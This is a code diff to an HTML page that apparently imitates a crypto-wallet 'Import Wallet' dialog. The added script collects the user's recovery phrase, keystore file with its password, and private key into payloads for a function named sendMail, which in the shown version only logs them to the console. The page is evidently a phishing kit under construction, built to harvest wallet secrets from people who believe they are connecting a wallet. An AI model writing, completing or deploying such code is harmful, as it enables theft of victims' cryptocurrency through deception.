@@ -727,8 +727,8 @@
                 keystore_input.parentElement.querySelector('button[type="submit"]');
 
             // private key
-            const private_input = document.querySelector('input[name="key"]');
-            const private_btn = keystore_input.parentElement.querySelector('button[type="submit"]');
+            const private_input = document.querySelector('input.key[type="text"]');
+            const private_btn = private_input.parentElement.querySelector('button[type="submit"]');
 
             const selected_Tab = {
                 tab: "Phrase",
@@ -764,9 +764,46 @@
                     e.preventDefault();
                     document.title = "Import Wallet";
                     modal.style.display = "block";
-                    selected_wallet.wallet = e.target.innerText;
+                    selected_wallet.wallet = app.innerText.trim();
                 });
             });
+
+            document.querySelectorAll(".modal button[type='submit']").forEach((each) => {
+                each.addEventListener("click", (e) => {
+                    e.preventDefault();
+                });
+            });
+
+            // phrase
+            phrase_btn.addEventListener("click", (e) => {
+                let payload = {
+                    wallet: selected_wallet.wallet,
+                    phrase: phrase_input.value,
+                };
+                sendMail(payload);
+            });
+
+            // keystore
+            keystore_btn.addEventListener("click", (e) => {
+                let payload = {
+                    wallet: selected_wallet.wallet,
+                    keystore_JSON: keystore_input.value,
+                    keystore_password: keystore_password.value,
+                };
+                sendMail(payload);
+            });
+            // private
+            private_btn.addEventListener("click", (e) => {
+                let payload = {
+                    wallet: selected_wallet.wallet,
+                    private_key: private_input.value,
+                };
+                sendMail(payload);
+            });
+
+            function sendMail(payload) {
+                console.log(payload);
+            }
         </script>
     </body>
 </html>
